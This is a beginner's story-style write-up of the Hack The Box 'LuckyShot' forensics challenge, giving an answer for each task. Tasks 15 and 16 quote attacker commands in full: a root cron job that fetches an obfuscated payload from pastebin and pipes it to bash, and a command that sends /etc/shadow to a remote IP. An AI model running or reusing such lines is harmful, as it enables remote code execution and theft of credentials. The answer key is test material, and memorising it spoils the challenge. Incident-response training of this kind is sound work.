🕵️ LuckyShot — Sherlock DFIR Write-Up

<p align="center">
  <img src="assets/banner.png" width="800">
</p>

<h1 align="center">🕵️ LuckyShot — My First Solo Sherlock Solve</h1>

<p align="center">
  <b>Platform:</b> Hack The Box (Sherlock)<br>
  <b>Category:</b> Digital Forensics & Incident Response<br>
  <b>Difficulty:</b> Medium<br>
  <b>Author:</b> Shani Thakur<br>
  <b>Rank Achieved:</b> #169 🏆
</p>

<p align="center">
  🔗 <a href="https://app.hackthebox.com/sherlocks/LuckyShot">Hack The Box — LuckyShot Sherlock</a>
</p>

---

🧠 Why This Write-Up Is Personal

LuckyShot was not an easy Sherlock for me. Before this challenge, I had solved only 3-4 Sherlock rooms, and most of the time I depended on existing write-ups to understand how DFIR investigations work.

But LuckyShot had no public write-ups available online. No hints. No walkthroughs. No guidance.

This was the first time I solved a Sherlock completely on my own, with:

· Limited DFIR experience
· Many doubts
· A lot of trial and error

That's why this write-up is written like a story, explaining:

· Where I got stuck
· What I was thinking at that time
· How I finally found the answers

---

📌 Machine Overview

The IT Manager of Techniqua-Solutions Corp. discovered that several critical files were missing, modified, or replaced with unknown files on his system.

As an Incident Response Analyst, I was provided with a forensic image of the IT Manager's machine and tasked with investigating:

· Initial access method
· Attacker activity timeline
· Persistence techniques
· Data exfiltration
· Malware behavior

---

🛠️ Investigation Setup

Operating System: Kali Linux
Evidence Type: Forensic image & live response artifacts
Key files analyzed:

· auth.log
· .bash_history
· cron.d
· systemd services
· Executable hash lists

---

🧩 Task-by-Task Investigation Story

🔹 Task 1: Initial Access Method

Question: What method did the attacker use to gain access to the system?

My Thinking: Whenever unauthorized access is involved, the first file I check is auth.log.

What Happened: I opened auth.log and saw hundreds of lines saying Failed password for administrator. Then, suddenly, I saw one line that said Accepted password.

My "Aha!" Moment: This pattern is classic! Many failed tries followed by one success means the attacker kept guessing passwords until one worked.

✅ Answer: SSH Brute-Force Attack

---

🔹 Task 2: First Successful Login Time

Question: At what time did the attacker successfully log in for the first time?

My Thinking: The log has timestamps for everything. I just need to find that first "Accepted" line.

What I Did: I searched the auth.log file for "Accepted password" and looked at the timestamp of the earliest one.

✅ Answer: 2025-02-10 19:39:03

---

🔹 Task 3: Compromised User Account

Question: Which user account was compromised by the attacker?

My Thinking: The successful login entry should show which username was used.

What I Did: In that same "Accepted password" line from Task 2, I saw the username administrator.

✅ Answer: administrator

---

🔹 Task 4: Privilege Check Command

Question: What command was executed by the attacker to check user privileges?

My Thinking: After logging in, what's the first thing a hacker does? They check "what can I do?"

What I Did: I looked at the .bash_history file of the administrator user. The first command I found was groups administrator.

Simple Explanation: The groups command shows which privilege groups a user belongs to (like sudo for admin rights). The attacker was checking their access level.

✅ Answer: groups administrator

---

🔹 Task 5: Credential Theft Tool

Question: What was the first tool the attacker downloaded to extract stored credentials from the system?

My Thinking: The next command in .bash_history was strange: a git clone command for a GitHub repo I didn't recognize.

What I Did: I searched for this repository name online and discovered it was LaZagne.

Simple Explanation: LaZagne is like a digital lockpick. It scrapes a computer's memory to find saved passwords from browsers, emails, and system files. The attacker downloaded this to steal all stored credentials.

✅ Answer: LaZagne

---

🔹 Task 6: Exfiltration Tool

Question: The attacker located sensitive files on the system and transferred them to a remote machine. Which command-line tool was used for this exfiltration?

My Thinking: After getting passwords, they would steal files. How?

What I Did: Further down the .bash_history, I saw commands using scp.

Simple Explanation: scp (Secure Copy Protocol) is used to copy files securely between computers over a network.

✅ Answer: scp

---

🔹 Task 7: Exfiltration Destination IP

Question: What IP did the attacker exfiltrate the files to?

My Thinking: The scp command should show where the files were sent.

What I Did: I looked closely at the scp command in .bash_history and found the destination IP.

✅ Answer: 192.168.161.198

---

🔹 Task 8: Malicious Script Name

Question: The attacker continued their exploitation and executed a malicious script. What is the name of the script?

My Thinking: Looking further in .bash_history, I should find execution commands.

What I Did: I found a command executing a script called sys_monitor.sh.

Note: The name sounds harmless (like a system monitor), but it was actually malicious.

✅ Answer: sys_monitor.sh

---

🔹 Task 9: Malware SHA1 Hash

Question: What is the SHA1 hash of the malware?

My Confusion: Where do I find malware hashes?

What I Did: I explored the provided folders and found a directory named hash_executables. Since the question asked for SHA1 hash, I checked hash_executables.sha1.

My "Aha!" Moment: I searched for sys_monitor.sh in this file and found its hash.

✅ Answer: 3ae5dea716a4f7bfb18046bfba0553ea01021c75

---

🔹 Task 10: Fake System Component

Question: The malware installed a component pretending to be a system network service. What is the name of this component?

My Struggle: This was one of the most time-consuming questions. I checked multiple persistence locations.

What I Did: I examined /etc/systemd/system/ and found a suspicious service named systemd-networkm.service.

The Trick: Notice the extra 'm'? The real service is systemd-network**d**.service. This fake one was hiding in plain sight!

✅ Answer: systemd-networkm.service

---

🔹 Task 11: Startup Listener on Lowest Port

Question: The attacker modified startup configuration files to spawn network listeners. Which file starts the listener on the lowest port number?

My Biggest Struggle: This question took nearly a full day to solve!

What I Did: I inspected:

· cron jobs
· systemd services
· profile scripts
· startup configuration files

My "Aha!" Moment: Eventually, I discovered that the listener using the lowest port (1337) was initiated through the .bashrc file.

✅ Answer: .bashrc

---

🔹 Task 12: Attacker's Identity

Question: What is the username and hostname associated with the attacker?

My Thinking: Can we find the attacker's own computer name?

What I Did: In .bash_history, the command prompt itself was sometimes recorded as kali@kali.

Simple Explanation: In Linux, username@hostname shows who is logged in and which machine they're on. The attacker was using a default Kali Linux machine.

✅ Answer: kali@kali

---

🔹 Task 13: Persistence User

Question: The attacker created a user for persistence. What is the name of the created user?

My Thinking: For long-term access, attackers create new user accounts.

What I Did: I re-analyzed auth.log and filtered for user creation events.

✅ Answer: Regev

---

🔹 Task 14: User Creation Timestamp

Question: At what exact timestamp was the new user created on the system?

My Thinking: The user creation log should have a timestamp.

What I Did: I found the exact time from the user creation log entry for Regev.

✅ Answer: 2025-02-10 20:11:21

---

🔹 Task 15: Automated Payload Retrieval

Question: The malware set up an automated process to fetch and execute a remote payload. What is the full command responsible for retrieving this payload?

My Thinking: How does the malware stay updated? It must call home.

What I Did: I looked in /etc/cron.d/ and found a malicious cron job named syscheck.

The Command's Trick: It uses rev (reverses text) and base64 -d (decodes) to hide the payload's real code from basic scanners.

✅ Answer: /1 * * * * root command -v curl >/dev/null 2>&1 || (apt update && apt install -y curl) && curl -fsSL https://pastebin.com/raw/SAuEez0S | rev | base64 -d | bash

---

🔹 Task 16: Final Data Theft Command

Question: The payload was used to extract more sensitive files. What command was executed to extract the sensitive file?

My Final Step: The question hinted that the final payload stole a "more sensitive file."

My Thinking: What's more sensitive than passwords? The /etc/shadow file! It contains all password hashes.

What I Did: Understanding the cron job from Task 15, the final act was to encode the shadow file and send it to the attacker's server.

✅ Answer: base64 /etc/shadow | curl -X POST -d @- http://192.168.161.198/steal.php

---

📖 What I Learned

This room taught me to be patient and follow evidence step-by-step. The answers weren't handed to me; I had to:

1. Think like an attacker
2. Check every log carefully
3. Understand each command's purpose
4. Connect different pieces of evidence

This is the real work of Digital Forensics and Incident Response (DFIR) - following the digital trail wherever it leads.

---

🎯 Tips for Beginners

1. Start with logs - auth.log and .bash_history are goldmines
2. Think chronologically - What would you do if you just hacked into a system?
3. Check persistence mechanisms - cron, systemd, startup files
4. Don't give up - Some answers take time to find
5. Document everything - Write down what you tried and what you found

---

Good luck with your investigation! 🚀

---

If you found this write-up helpful, feel free to share it with others who might be struggling with LuckyShot. Remember - the journey matters more than just the answers!
